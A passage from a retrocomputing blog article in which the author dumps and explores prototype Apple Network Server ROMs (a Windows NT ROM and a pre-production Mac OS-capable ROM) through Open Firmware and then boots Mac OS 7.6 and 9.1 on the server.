/terminal-emulator@0,0 0043A4A8: /bandit@F2000000 0043B500:   /53c825@11 0043DDE0:     /sd@0,0 0043EA48:     /st@0,0 0043F8A8:   /53c825@12 00442188:     /sd@0,0 00442DF0:     /st@0,0 00444288:   /gc@10 004446C0:     /53c94@10000 00446460:       /sd@0,0 00447248:       /st@0,0 004480C8:     /mace@11000 00449248:     /escc@13000 004493A0:       /ch-a@13020 00449AD8:       /ch-b@13000 0044A210:     /awacs@14000 0044A2F8:     /swim3@15000 0044BB88:     /via-cuda@16000 0044D088:       /adb@0,0 0044D178:         /keyboard@0,0 0044D950:         /mouse@1,0 0044DA00:       /pram@0,0 0044DAB0:       /rtc@0,0 0044DFE0:       /power-mgt@0,0 0044E1B8:     /nvram@1D000 00462BC8:     /lcd@1C000 00450780:   /pci106b,1@B 00450958:   /54m30@F 0044E7D0: /bandit@F4000000 00462350:   /pci106b,1@B 0044FF28: /hammerhead@F8000000  ok 0 &gt;\\nWe'll do the first and last of these in the remainder of this article. Since the Bible says the first shall be last and the last first, let's begin with the\\nfinal\\nknown ANS ROM, 2.26NT.\\n2.26NT Windows NT ROMs\\nHancock's late 1996 announcement that the Apple Network Server would optionally run Windows NT caught many industry observers by surprise. Although NT 3.x and 4.x were designed to be architecture-independent and ran on processors as diverse as MIPS and DEC Alpha as well as 32-bit x86, the PowerPC build had been limited to low-volume IBM hardware and never officially ran on Power Macs. Still, it was clear to Apple that NT would be very important in the industry and felt supporting it would broaden the appeal of the server line \u2014 or at least soften the impact of its sticker price. Importantly, NT support would not have to wait for Apple's then-expected CHRP Power Macs: reworked ROM support could enable the ANS to boot it \"now.\" (In the end, Jobs eventually scuttled the CHRP initiative to starve the Mac clones; the upcoming New World Macs were ultimately an incompatible blend of CHRP and the earlier PReP standard instead.)\\nWhen Jobs talked Gil Amelio into canning the ANS as well, the ROM initiative naturally went out the window with it. However, while the existing 2.0 Mac OS ROMs are only known on an unmarked development flash stick similar to mine, these final 2.26NT ROMs appear almost production-ready with fully printed labels, suggesting they had reached a very late stage of development. (The \"ESB\" tag indicates a prototype designation \u2014 consistent with Shiner, the ANS'\\nbeer-themed codename during development\\n, ESB stands for \"Extra Special Bitter.\")\\nThese ROMs were kindly sent to me by a former Apple employee at the Elk Grove, CA campus. Sadly this person no longer has the 700 they were running in, but attests to the fact NT did run and apparently even ran well, adding, \"I\u2019m pretty certain that the NT ROM was the Apple business systems team trying to find a way to keep their product from being canceled completely. Motorola had just shipped their PowerStack NT machines a few months previously and they were garbage compared to the ANS when it came to field service and expandability.\" (So true!)\\nThe NT ROM DIMM simply replaces the production ROM DIMM in the slot. We'll power it up with the front key set to service just in case.\\nOn the LCD, not only is the version displayed, but as mentioned this is also one of the ROMs that checks for a second CPU (if we had one of the prototype dual-CPU cards, that is \u2014 contact me, I'm interested if you've got one to get rid of!).\\nOur first order of business is to immediately dump these ROMs for posterity (they are posted on\\nthe group thread at Tinker Different\\n). This can be done without a chip reader by having Open Firmware itself dump the contents in hex over one of the serial ports, and then post-processing the resulting output.\\nWe start by switching the console to a serial port using\\nsetenv input-device ttya:57600\\nand\\nsetenv output-device ttya:57600\\n(\\nttya\\nis port 2 on the back) followed by\\nreset-all\\nto commit the settings. Then, on a connected terminal program at 57600bps capturing the output (I did something like\\npicocom -b57600 /dev/cu.usbserial-10 | tee out\\n), you can either enter\\nh# ffc00000 h# 00400000 dump\\nwhich dumps the contents with the addresses, or if you don't need those, you can try something faster but a little more complicated like (suggested by @joevt)\\n0 ffc00000 do i 3f and 0= if cr then i l@ 8 u.r 4 +loop cr\\nwhich emits 64 bytes per line. The ANS ROM is already visible in the default memory map, so it can be dumped immediately.\\nThis process is not very quick, but when it finishes you would take the transcript and turn the hex strings back into binary (Perl's\\npack\\nfunction is perfect for this), which if properly captured would yield a file exactly 4,194,304 bytes long. Something like this should work on the 64-bytes-per-line output:\\n#!/usr/bin/perl <p>select(STDOUT); $|++; while(&lt;&gt;) {     chomp; chomp; next unless (length == 128);     print STDOUT pack(\"H*\", $_); }\\nwhich the Perl golfers will probably have turned into a handful of indecipherable bytes in the comments shortly. After the process is complete,\\nsetenv input-device kbd\\n,\\nsetenv output-device screen\\nand\\nreset-all\\nwill move the console back to the ADB keyboard and VGA port.\\nThere are a number of interesting things about this ROM, though most of it (about the first 3MB) is still identical to the 9500's.\\nThe default boot device remains\\ndisk2:aix\\n, but there are apparently NT-specific words in this version of Open Firmware like\\nnt-gen-configs\\n,\\nnt-gen-config-vars\\n,\\ninit-nt-vars\\n,\\nmaybe-create-nt-part\\n, etc. Their Forth code looks like this:\\nok 0 &gt; see nt-gen-configs defer nt-gen-configs : (nt-gen-configs    maybe-read-nt-part get-first-str    begin      while/if        _cfgval _cfgvallen encode-string _cfgname count set-option get-next-str      repeat    ; ok 0 &gt; see nt-gen-config-vars defer nt-gen-config-vars  : (nt-gen-config-vars    maybe-read-nt-part get-first-str    begin      while/if        _cfgname count _configname pack drop ['] string-var gen-config-var        get-next-str      repeat    ; ok 0 &gt; see maybe-read-nt-part  : maybe-read-nt-part    init-nt-vars osnv-good? if      read-part      else      nvram-buffer nv-buffer-size erase      then    ; ok 0 &gt; see init-nt-vars  : init-nt-vars    nvram-buffer 0= if      /osnv dup to nv-buffer-size alloc-mem to nvram-buffer nvram-buffer nv-buffer-size      erase nvram-size alloc-mem to _cfgval nvram-size to _cfgval-size _cfgval      _cfgval-size erase      then    ;\\nFrom this you can get the general notion that these allocate a block of NVRAM for NT-specific configuration variables. There are also words for direct mouse support.\\nIf we list out packages, we see other interesting things.\\nok 0 &gt; dev /  ok 0 &gt; ls  FF8362C0: /PowerPC,604@0 FF836570:   /l2-cache@0,0 FF836DA8: /chosen@0 FF836ED8: /memory@0 FF837020: /openprom@0 FF8370E0: /AAPL,ROM@FFC00000 FF8373A0: /options@0 FF837878: /aliases@0 FF837AF0: /packages@0 FF837B78:   /deblocker@0,0 FF8383E0:   /disk-label@0,0 FF838988:   /obp-tftp@0,0 FF83BFA0:   /mac-files@0,0 FF83C7A0:   /mac-parts@0,0 FF83D078:   /aix-boot@0,0 FF83D808:   /fat-files@0,0 FF83F608:   /iso-9660-files@0,0 FF840390:   /xcoff-loader@0,0 FF840DB8:   /pe-loader@0,0 FF8416A0:   /terminal-emulator@0,0 FF841738: /bandit@F2000000 [...]\\nYes, there is a\\npe-loader\\npackage \u2014 as in Portable Executable, the format first introduced in Windows NT 3.1 to replace the old 16-bit New Executable\\n.exe\\n, and today the standard executable format for all modern versions of Windows. Here are some pieces of that:\\nok 0 &gt; see boot  : boot    \"boot \" boot|load init-program go ; ok 0 &gt; see boot|load  : boot|load    _reboot-command pack drop set-diag-mode ['] (init-program) to ^-7DA998   carret word count (load) ; ok 0 &gt; see init-program defer init-program  : (init-program)    0 to ^-7DB118  loadaddr \"\\ \" comp 0= if      \"evaluating Forth source\" type loadaddr loadsize evaluate loadaddr loadmapsize      do-unmap true to ^-7DB118     else      loadaddr 2c@-be F108 = if        \"evaluating FCode\" type loadaddr 1 byte-load loadaddr loadmapsize do-unmap        true to ^-7DB118       else        loadaddr 2c@-be 1DF = if          \"loading XCOFF\" type 0 0 \"xcoff-loader\" $open-package \"init-program\"          2 pick $call-method close-package          else          loadaddr 2c@-be F001 = if            \"Loading PE/COFF\" type cr 0 0 \"pe-loader\" $open-package \"init-program\"            2 pick $call-method close-package            else            \"unrecognized Client Program format\" type            then          then        then      then    ; ok 0 &gt; dev /packages/pe-loader  ok 0 &gt; words  init-program    close           open            map-space       header-size     new-load-adr   stack-size      scthdr.size     &gt;pes.rawptr     &gt;pes.size_raw   &gt;pes.rva        &gt;pes.virt_size  </p> <p>pes.name       opthdr.size     &gt;peo.no_dir     &gt;peo.loader_flags               &gt;peo.heap_com_size             peo.heap_res_size              &gt;peo.stack_com_size             &gt;peo.stack_res_size            peo.head_size  &gt;peo.image_size &gt;peo.file_algn  &gt;peo.scns_algn  &gt;peo.image_base &gt;peo.sndata    peo.sntext     &gt;peo.entry      &gt;peo.bsize      &gt;peo.dsize      &gt;peo.tsize      &gt;peo.magic     filehdr.size    &gt;pe.nscns       &gt;pe.machine     ok 0 &gt; see init-program  : init-program    real? little? 0= or real_base 700000 u&lt; or \"load-base\" eval 700000 u&lt; or    if      \"false\" \"real-mode?\" $setenv \"true\" \"little-endian?\" $setenv @startvec      &gt;ramsize @ h#100000 - dup (u.) \"real-base\" $setenv h#100000 - (u.) \"load-base\"      $setenv cr \"RESETing to change Configuration!\" type cr force-reboot      then    loadaddr filehdr.size + &gt;peo.image_base @ dup to new-load-adr \"image_base  \"    type u. cr loadaddr filehdr.size + &gt;peo.head_size @ to header-size new-load-adr    stack-size - loadsize h#fff + h#-1000 and stack-size + map-space new-load-adr    stack-size - stack-size 0 fill loadaddr header-size + new-load-adr loadsize    header-size - move new-load-adr loadsize header-size - bounds do      i ^dcbf i ^icbi 14      +loop    loadaddr loadsize do-unmap 0 4000 map-space install-interrupt-vectors ci-regs    h#100 h#deadbeef filll new-load-adr stack-size - FF00 + spsv reg! new-load-adr    sasv reg! new-load-adr srr0sv reg! ['] cientry argsv reg! 0 crsv reg! msr@    17FFF and srr1sv reg! state-valid on ?state-valid ; ok 0 &gt;\\nYour eyes deceive you not: when configured to boot NT, this ROM runs the machine\\nlittle-endian\\n\u2014 which at the time would have been a first for a Power Mac as well, though this is the only way that Windows NT on PowerPC\\never ran\\n. 32-bit PowerPC has little-endian support through a little-endian bit in the machine state register or by setting a flag on memory pages in the MMU (which is how Virtual PC ran) or at the instruction level with byteswapping, but to this point all official Power Mac payloads had run big.\\nThat means this ROM may be able to run PowerPC Portable Executables directly, so I got out my OEM Windows NT 4.0 kit to see.\\nI ran those words just in case they made a difference and then tried to do a na\u00efve boot directly from the Windows NT 4 CD. This looks something like\\nboot disk0:,\\ppc\\setupldr\\n(don't forget the colon and the comma).\\nAnd, well, it can indeed load it and has a sensible image base address \u2014 but immediately crashes with a\\nCLAIM failed\\n, suggesting it couldn't map memory for the executable image, even though 32MB of RAM should have been more than enough to start Windows NT Setup. You can see from\\ninit_program\\nabove that it provides computed  values for Open Firmware\\nload-base\\nand\\nreal-base\\n, so I imagine they were tailored specifically to boot NT (and NT Setup), but nevertheless I couldn't get past this point.\\n[In the comments, Andrei Warkentin asked if it could boot the veneer from the CD. It parses ...\\n... but it does not run either.]\\nTo be sure, we almost certainly don't have all the pieces together for a successful NT boot\\nyet\\n. One thing I could find no trace of in the ROM was ARC. We talked about the rise and fall of ARC in\\nour SGI Indigo\\n2\\nrefurb weekend\\n, but even though IBM, Sun, HP, Intel and Apple were never members of the Advanced Computing Environment consortium, Microsoft was. As a consequence virtually any machine capable of booting Windows NT would have some means of system specification through ARC (this particular historical vestige persisted until Windows Vista). On DEC Alphas, this was implemented in firmware, which is why you need the right firmware to boot it; for the IBM Power Series workstations and laptops, the ARC console was on floppy disk. It is highly likely the ANS also had an ARC console of its own, and since it doesn't appear to be in the ROM, there must have been a floppy or CD that provided it which we don't have.\\nAdditionally, Windows NT relies on a hardware abstraction layer (HAL) which operates between the physical hardware and the rest of the operating system. The HAL is even more lower-level than device drivers, implementing functions like allowing device drivers to access ports in a more standardized fashion, abstracting away interrupt management, and unifying firmware interfaces and DMA. There are HAL DLLs on the 4.0 CD for various IBM (Types 6015, 6020, 6030, and 6070), FirePower (Powerized MX and ES) and Motorola (PowerStack 2 and Big Bend) PowerPC systems, but none for any Power Mac. The HAL necessarily gets loaded early in the setup process, often from another floppy, and you won't be able to successfully bring up Windows NT without it. Although there are apocryphal references to \"halbandit\" out there and this name is likely a reference to the ANS HAL, we don't have it either. (While it should be possible to get\\nthe Windows NT for Power Mac port\\nrunning on the ANS, per the maintainer its current HAL relies on Mac OS support, so it wouldn't actually be using this ROM.)\\nDo you have any of these pieces? Post in the comments, or if you'd prefer to be anonymous, drop me an E-mail at ckaiser at floodgap dawt com.\\nEven without Jobs' looming axe, NT on the ANS was probably ill-starred anyway no matter how well it ran. The unique persistence of Windows NT on the DEC Alpha was a side-effect of primary architect Dave Cutler strongly basing NT on DEC VMS, an aspect hardly lost on DEC's legal team, to the point where various filenames and directory structures in the NT codebase even directly matched those in VMS. To avoid a lawsuit Microsoft paid off DEC, helped promote VMS, and committed to continued support for NT on Alpha, which remained until the beta phase of Windows 2000. This situation was absolutely not the case with PowerPC: IBM was so irked with Microsoft over OS/2 and NT's adoption of an expanded Windows API instead that its support for RISC NT was never more than half-hearted. Likewise, the only MIPS hardware that ran NT were DECstations \u2014 quickly cancelled by DEC in favour of Alpha \u2014 and directly from MIPS, the Magnum R4000 \u2014 also cancelled to avoid competition with Silicon Graphics' IRIX hardware when SGI bought them out. At that point, and already not favourably predisposed to Microsoft's initiative, IBM didn't see any value in continuing to support Windows NT on PowerPC and Amelio's Apple definitely didn't have the resources to do so themselves.\\n1.1.20.1 preproduction ROMs\\nLet's rewind a bit here and talk about booting Mac OS on the ANS, given that's how all this got started in the first place. The stock 1.1.22 ROM blocks booting it at the Open Firmware level:\\nok 0 &gt; dev /AAPL,ROM  ok 0 &gt; words  load            open            ok 0 &gt; see open  : open    \"MacOS is not supported. \" type false    ; ok 0 &gt; see load  : load    real_base 400000 &lt;&gt; virt_base -800000 &lt;&gt; or real? or little? or if      10 base ! \"FFFFFFFF\" \"real-base\" $setenv \"FFFFFFFF\" \"virt-base\" $setenv      \"false\" \"real-mode?\" $setenv \"false\" \"little-endian?\" $setenv \"boot /AAPL,ROM\"      !set-restart cr \"RESETing to change Configuration!\" type cr reset-all      then    ; ok 0 &gt;\\nIf you try anyway with\\nboot /AAPL,ROM\\n, it won't work.\\nYou can force it by patching out those Forth words, but even though it will try to start, it will immediately crash and return you to the Open Firmware prompt.\\nStill, repeated reports back in the day swore they could do it. A couple people\\ntried using 9500 ROMs\\n, noting they would get a picture on an IMS Twin Turbo video card, though there was disagreement on whether it could actually boot anything and the different Bandit mapping almost certainly assured this wouldn't get off the ground. A few other people had intermittently acquired remaindered ANS systems from Apple that did indeed boot MacOS (retrospectively they very likely had 2.0 ROMs in them). More interesting, however, were reports that the Network Servers had\\npreviously\\nbooted Mac OS during development.\\nOne of these early ROMs ended up sitting in a box in my closet for about 20 years. Apple Austin (the address on the box is no longer an Apple building) was the last stand of the Network Server, where a number of systems remained serving content as late as 2005. Per an Apple employee on the LinuxPPC-ANS list in March 2003, \"Our team here at Apple decommissioned over 40 Shiners early last year. They used to be the backbone of the Apple Support site [that is, the former\\nwww.info.apple.com\\n] serving all the software downloads, all the images for the support site and performing much of the heavy lifting behind the scenes that made our website the highest rated support site in the industry.\" About twenty of them were sold to list members \u2014 I was a starving medical student at the time and couldn't afford either the cash or the space \u2014 but I did make a deal to pick up some of the spare parts. I got two 10Mbit Ethernet cards and some 68-pin SCSI interconnects, and also some RAM. I didn't look too closely at what was in the box otherwise. I am told the servers that did not sell were crushed. :(\\nIt wasn't until I was looking through my box for a spare ROM to see if I could get it converted to 2.0 that I found this ROM stick in the bottom of the box. It was not labeled and if I hadn't seen a picture of the 2.0 ROM, I probably wouldn't have recognized it for what it was.\\nThis was how the 2.0 ROM looked in the Apple employee's Deep Dish that booted OS 9. Apple used flashable DIMMs exactly like this for Power Mac development generally; the form factor will fit in any beige Power Mac. (We don't know how to flash these yet but I know people are working on it.)\\nStill, the fact it came from the Network Server afterlife meant it probably wasn't any ordinary DIMM, so now let's give it a spin.\\nIt comes right up ... and it's a pre-production ROM! This is currently the earliest known ROM available for the Network Server. I have no idea how it got in that box; I didn't request a spare ROM DIMM from them, but it was down at the bottom with the network cards and the other pieces that I did order.\\nI immediately dumped this one also to compare. Our Apple employee with the 2.0 ROMs also had a 1.1.20.1 set, and the hashes match his dump, so this is the same.\\ndisk2:aix Device isn't there! can't OPEN: /bandit/53c825@11/sd@2,0:aixOpenFirmware1.1.20 To continue booting the MacOS type: BYE To continue booting from the default boot device type: BOOT  ok 0 &gt; dev /  ok 0 &gt; ls  FF830648: /PowerPC,604@0 FF8308F8:   /l2-cache@0,0 FF831158: /chosen@0 FF831288: /memory@0 FF8313D0: /openprom@0 FF831490: /AAPL,ROM@FFC00000 FF8316F0: /options@0 FF831BD0: /aliases@0 FF831E10: /packages@0 FF831E98:   /deblocker@0,0 FF832738:   /disk-label@0,0 FF832CA8:   /obp-tftp@0,0 FF8358B8:   /mac-files@0,0 FF8361A0:   /mac-parts@0,0 FF836AC0:   /aix-boot@0,0 FF837218:   /fat-files@0,0 FF838B80:   /iso-9660-files@0,0 FF839670:   /xcoff-loader@0,0 FF83A1A0:   /terminal-emulator@0,0 FF83A238: /bandit@F2000000 FF83B290:   /53c825@11 FF83DB70:     /sd@0,0 FF83E7D8:     /st@0,0 FF83F638:   /53c825@12 FF841F18:     /sd@0,0 FF842B80:     /st@0,0 FF844018:   /gc@10 FF844450:     /53c94@10000 FF8461F0:       /sd@0,0 FF846FD8:       /st@0,0 FF847E58:     /mace@11000 FF848FD8:     /escc@13000 FF849130:       /ch-a@13020 FF849868:       /ch-b@13000 FF849FA0:     /awacs@14000 FF84A088:     /swim3@15000 FF84B918:     /via-cuda@16000 FF84CE18:       /adb@0,0 FF84CF08:         /keyboard@0,0 FF84D6E0:         /mouse@1,0 FF84D790:       /pram@0,0 FF84D840:       /rtc@0,0 FF84DD70:       /power-mgt@0,0 FF84DF48:     /nvram@1D000 FF8628D8:     /lcd@1C000 FF850490:   /pci106b,1@B FF850668:   /54m30@F FF84E560: /bandit@F4000000 FF862060:   /pci106b,1@B FF84FCA8: /hammerhead@F8000000  ok\\nThis ROM specifically advertises it can boot Mac OS, and there is no block in Open Firmware.\\n0 &gt; dev /AAPL,ROM  ok 0 &gt; words  load            open            ok 0 &gt; see open  : open    true    ; ok 0 &gt; see load  : load    real_base 400000 &lt;&gt; virt_base -800000 &lt;&gt; or real? or little? or if      10 base ! \"FFFFFFFF\" \"real-base\" $setenv \"FFFFFFFF\" \"virt-base\" $setenv      \"false\" \"real-mode?\" $setenv \"false\" \"little-endian?\" $setenv \"boot /AAPL,ROM\"      !set-restart cr \"RESETing to change Configuration!\" type cr reset-all      then    ?cr \"MacOS is currently unsupported, use at your own risk.\" type     ; ok 0 &gt;\\nHowever, if you enter\\nbye\\nas directed with a CD in the internal CD-ROM, the screen will go blank and nothing will happen.\\nThe clue comes from those who claimed they got the system partially running with 9500 ROMs: the 9500 has no on-board video and always came from Apple with a video card, so they added a video card. With that, they got a picture\\non the video card\\n. No Mac OS support for the internal Fast Wide SCSI nor the Cirrus Logic video is implemented in this ROM, and as we mentioned earlier, having never been used in any prior Apple product, the operating system proper doesn't know what they are either. In fact, the Cirrus Logic video is gimped even in AIX \u2014 the ANS Hardware Developer Notes say that the video controller provides \"only a little-endian window into the packed-pixel frame buffer, hence Big Endian [sic] operating systems are limited to 8 bits per pixel unless low-level transformation routines are written.\"\\nFor a server that's probably good enough. For a really powerful under-the-desk workstation, that stinks. Let's add a video card.\\nI chose an IMS Twin Turbo 128MA, nearly the pinnacle of 2D classic Mac performance, and one of the BTO options Apple offered for the 9500.\\nI also put as much high-capacity parity RAM in it as I could get my hands on. The biggest parity FPM DIMMs I have in stock were 64MB. You may need to examine your RAM sticks carefully to make sure you aren't actually putting in\\nnon\\n-parity (the stick in the bottom picture is\\nnot\\nparity). These two got me 128MB to start.\\nInitially I could only scrape together 192MB of parity RAM from what I had left and the 16MB upgrade kits, so I started with that.\\nFor a test boot, I decided to try the external DB-25 BlueSCSI dongle I had left over from when we experimented with\\nNovell NetWare on the Power Macintosh 6100\\n, for two reasons: it already had a bootable image of 7.6 on it I was using for another project, and it also has an image of Cyberpunk, Apple's codename for the very alpha port of NetWare to the Power Mac originally intended for Shiner systems. Recall that this Forth word exists in every known ANS ROM, even the late 2.26 NT ROM, with the notable exception of the 2.0 MacOS ROMs:\\n0 &gt; see setenv-netware  : setenv-netware    \"false\" \"real-mode?\" $setenv \"ttya:19200\" \"input-device\" $setenv \"ttya:19200\"    \"output-device\" $setenv ?esb if      \"scsi-int/sd@2:0\"      else      \"scsi-int/sd@3:0\"      then    \"boot-device\" $setenv    ; ok\\nI wasn't sure if this version of Cyberpunk, intended for Piltdown Man machines (i.e., the 6100 and allies), would start on it but if any ROM could, I felt sure these beta ROMs had a decent chance. I set the Open Firmware\\ninput-device\\nback to the default\\nkbd\\nand the\\noutput-device\\nback to the default\\nscreen\\nand brought it back up again.\\nNotice that it will still try to boot AIX as default \u2014 you would need to change the boot device to\\n/AAPL,ROM\\nto autoboot Mac OS, and this will be lost if the board NVRAM gets reset.\\nAt this point, we plug the monitor into the Twin Turbo card and blindly type\\nbye\\n. Yes, you can set the Open Firmware\\noutput-device\\ndirectly to the video card \u2014 something like\\n/bandit@F2000000/IMS,tt128mbA@D\\nwould work for slot 1 \u2014 but this isn't necessary to boot ...\\n... because the Toolbox ROM will automatically use the card anyway and we get our long awaited Happy Mac. This is analogous to the situation on a real 9500 where Open Firmware 1.0.5 isn't on the console; by default it's on the serial ports. Another big heaping bowl of foreshadowing for you to keep in mind.\\nI left the Cyberpunk image on SCSI ID 0 to see what it would do, though I was pretty sure it would fail, and it did. This image has System 7.1.2 on it and no PCI Power Mac officially supported anything earlier than 7.5.2.\\nBut, rearranging the IDs so that the 7.6 image was on ID 0 and the Cyberpunk image was in ID 1, 7.6 will boot! Let's switch to proper screenshots.\\nUnsurprisingly, 7.6's relatively underpowered System Profiler identifies the system as Gestalt ID 67, which matches the 9500, 9515, 9600 and the WGS 9650, but gives us little more detail than that. For a deeper dive we'll fire up TattleTech which was already on this disk image.\\nTattleTech reports the same Gestalt ID.\\nCursorily scanning the Gestalt ID list, they all look pretty similar to a Mac of that generation booting 7.6. There is little hint here that this computer is anything other than a 9500.\\nOn the other hand, the PCI slot layout is a little different. Like the 9500 and 9600, the ANS has two Bandits (there is even space in the memory map for a third, which remains unimplemented) and thus two PCI busses, but the 9500/9600 assign\\nthree slots each to each Bandit\\n(Grand Central handling non-PCI devices is on the first). In the ANS, the first Bandit also carries the internal SCSI and internal video as well as Grand Central, so it only handles two slots, with slot 3 going to the second Bandit. This rearrangement manifests here in TattleTech showing just two slots on the first bus.\\nThe ROM checksum also doesn't match. 9500 ROMs contain an Apple checksum of either $96CD923D or $9630C68B (the 9600 might also have $960E4BE9 or $960FC647), but this ROM checksums as $962F6C13. The same checksum appears in the 1.1.22 production ROM, which still contains a substantial portion of the 9500 v2 ROM even though it definitely won't boot Mac OS. This likely represents held-over code that simply no one bothered to remove.\\nWe can also see that the two internal SCSI busses are detected, even if they aren't bootable with this ROM, and they are properly probed as a 53C825. The 53C94 used for the external SCSI which we are running from likewise appears.\\nFinally, the built-in AAUI Ethernet is detected as well (MACE, via Grand Central). I point this out specifically because ...\\n... it doesn't seem to work. While both AAUI dongles I tried showed working LEDs and activity on the network, 7.6 refused to enable the port. This did work in AIX at one point when I used it to sub for\\nstockholm\\nwhile investigating a hardware fault, but now it won't netboot either from Open Firmware. I'm concluding the MACE embedded in CURIO works but the PHY it connects to must have crapped out in storage.\\nSince we have the Cyberpunk image up, I tried running the PDMLoader just to see. Recall from our\\nNetWare on Power Macintosh\\narticle that the PDMLoader is, at least on NuBus Power Macs, what starts the NWstart kernel and enters NetWare. Among other things it provides a fake Open Firmware environment to allow those Macs to resemble a Shiner ESB unit for demonstration purposes, which was the intended target hardware. Early Shiners reportedly could boot it directly. Unsurprisingly, the PDMLoader checks that it was started on a supported Mac and (based on the Gestalt ID) finds our franken-ANS wanting.\\nIf we look back at our definition for\\nsetenv-netware\\n, however, we can see NetWare was expected to run from a so-called \"partition zero\" loader. This is like it sounds: a runnable binary occupies partition zero of a bootable disk, usually XCOFF, and is loaded as blocks into memory by Open Firmware and executed. Unfortunately, the Installer we used for Cyberpunk didn't support creating this, and it wouldn't have been necessary for a NuBus Power Mac anyway which doesn't boot like that. As it's a regular XCOFF binary otherwise, I tried putting\\nNWstart\\nonto a plain physical ISO 9660 CD and fed that to 1.1.20.1, but ...\\ndisk2:aix Device isn't there! can't OPEN: /bandit/53c825@11/sd@2,0:aixOpenFirmware1.1.20 To continue booting the MacOS type: BYE To continue booting from the default boot device type: BOOT  ok 0 &gt; boot disk0:,\\NWSTART.  disk0:,\\NWSTART.  loading XCOFF tsize=2A14A1 dsize=90028 bsize=10E17C entry=843EC  SECTIONS: .pad     00000000 00000000 00000E14 000001EC .text    00000000 00000000 002A14A1 00001000 .pad     00000000 00000000 00000B5F 002A24A1 .data    00000000 00000000 00090028 002A3000 .bss     00090028 00090028 0010E17C 00000000 .pad     00000000 00000000 00000FD8 00333028 .loader  00000000 00000000 0003BC04 00334000 loading .text, done.. loading .dataCLAIM failed  ok\\n... while the ROM can read the file from disc and it will load, it halts with the same memory claim error I got trying it on the 500 with production ROMs, even after fiddling with the load and real base values to accommodate a large kernel. It's possible this kernel won't run outside of the PDMLoader environment and the Shiners used a different one, but that's not on the CD I have. Oh well.\\nSince the on-board Ethernet was shot, I decided to see if I could get it working with one of the Ethernet cards I ordered from Apple Austin way back when. This is a 10Mbit \"Apple Ethernet PCI\" card but not the same as the more typical one found in regular Power Macs \u2014 this particular card (820-0765-A, 630-1798, MM4709Z/A) is specific to the Apple Network Server. It has 10baseT, 10base2 and AAUI ports and is based on the DEC 21041 \"Tulip\" NIC, and is also distinct from the ANS 10/100 card (M3906Z/A). I installed the card in slot 6 so it would be on the other Bandit.\\nRummaging through the box with the Ethernet cards in it, I also found some more 16MB sticks and bumped the parity RAM to 224MB at the same time.\\nUnfortunately Mac OS 7.6 doesn't see the card; it isn't even offered as a choice. This seemed like a good time to try installing Mac OS 9, first because it might have updated drivers, and second because I wanted to see if 9.1 would work in any event. I ended up copying the 7.6 screenshots to the main server with LocalTalk PhoneNET and a really long telephone cable, which my wife graciously chose to ignore temporarily as well.\\nIncidentally, a shout-out to my trusty Power Macintosh 7300 that batch-converts these and other PICT screenshots to PNG using Graphic Converter.\\nTo start clean, I powered off the box, pulled the plug and turned the rear key for a full reset. While I waited for that to finish, I set up a new microSD card with an empty hard disk image and copied in an ISO of Mac OS 9.1. With power restored and the BlueSCSI reconnected, the CD image booted up \u2014 a gratifying sign that Mac OS 9 was going to work just fine \u2014 and I formatted the virtual hard disk in Drive Setup.\\nEven though it was over the slow 5MB/sec external SCSI, the installation went surprisingly quickly, likely because the emulated \"CD\" it was installing from was so fast. When it finished, I restarted the ANS ... and got a black screen on both the video card and the onboard VGA, even though I could see activity on the BlueSCSI and heard alert sounds. The ANS also properly responded to me pressing RESET and RETURN to cleanly shut it down, just like a Mac should. I reset the board again and it rebooted normally with\\nbye\\nfrom the blind console. We're going to come back to this really soon, because now I was starting to doubt the logic board despite all our testing earlier.\\n9.1 System Profiler again identifies it with Gestalt ID 67. Everything shows up here that we expect to, including the CPU, clock speed, RAM size and L2 cache.\\nWe also see our Twin Turbo and Apple Ethernet PCI cards.\\nAnd, to my profound pleasure, it shows up (as \"Ethernet slot SLOT.&gt;4\" [sic], even though I put it in slot 6, because it's slot 4 to the second Bandit) and can be selected.\\nWe are now able to mount our usual assisting Netatalk server over the Ethernet, which replaces one long cable with another long cable, but it's all in the name of science! I did try the MACE Ethernet one more time here, and 9.1 doesn't throw an error, but it still doesn't work.\\nAs a transfer test I pulled Gauge Pro off the server. It transferred completely and quickly, so I ran it to see what it thought about the hardware, and it didn't seem to find anything unusual.\\nSo, about those reboots. At this point I shut down the machine and found the same thing happened when I tried to start it up again: a black screen, rectified by another complete board reset, but the Mac OS still seemed to boot headless and regardless. After the third such attempt, and out of ideas, I decided to foul the boot completely and see what was going on over the serial port. This can be done by letting it boot in regular mode, then for the next boot ensure the floppy drive is empty and turn the key to service, which will forget the boot setting from beforehand and try to start diagnostics. Lo and behold ...\\nfd:diags  NO DISK  can't OPEN: /bandit/gc/swim3:diagsOpenFirmware1.1.20 To continue booting the MacOS type: BYE To continue booting from the default boot device type: BOOT  ok 0 &gt; printenv  security-#badlogins 1  security-password  security-mode       none <p>little-endian?      false               false real-mode?          false               false auto-boot?          true                true diag-switch?        false               false fcode-debug?        false               false oem-banner?         false               false oem-logo?           false               false use-nvramrc?        true                false f-segment?          false               true real-base           -1                  -1  real-size           100000              100000  virt-base           -1                  -1  virt-size           100000              100000  load-base           4000                4000  pci-probe-list      -1                  -1  screen-#columns     64                  64  screen-#rows        28                  28  selftest-#megs      0                   0  boot-device         /AAPL,ROM           disk2:aix boot-file                              diag-device         fd:diags            cd fd:diags /AAPL,ROM diag-file                              input-device        ttya                kbd output-device       ttya                screen oem-banner                             oem-logo                                 z 2C + 8CC '&amp; 8 + BRpatchyn then ;;l-method else $call-parent then ; boot-command        boot                boot  ok 0 &gt;\\n... the serial port was active. Instead of\\nkbd\\nand\\nscreen\\n(or the TT video card directly), I could see the input and output devices had been set to\\nttya\\n. I didn't do that \u2014 Mac OS did that. Its fingerprints can be found in the apparently nonsense line of text between\\noem-logo\\nand\\nboot-command\\n, which is in fact an NVRAMRC expected to run at startup to wallpaper firmware bugs.\\nNow it made sense what was going on. Mac OS thought this was a\\nreal\\n9500, and patched its Open Firmware variables accordingly. The default settings for the Open Firmware 1.0.5 console point to the serial port, but on a real 9500 where Open Firmware wasn't intended as a user-facing interface, the ROM would simply ignore them and continue the boot with the video card and ADB HIDs. Not so on the ANS, where Open Firmware is meant to be interacted with directly: it actually\\nobeys\\nthese settings! While Mac OS still brought ADB up regardless, neither the video card nor the onboard video would be enabled, and so the screen would stay black. (\\nNetBSD/macppc explains a related phenomenon.\\n)\\nHowever, even after I reset the\\ninput-device\\nand\\noutput-device\\nto\\nkbd\\nand\\nscreen\\n, I still got no display. But from a cold board reset we wouldn't have an NVRAMRC either, so I also added\\nsetenv use-nvramrc? false\\n, and\\nnow\\nwe reboot successfully! The PRAM 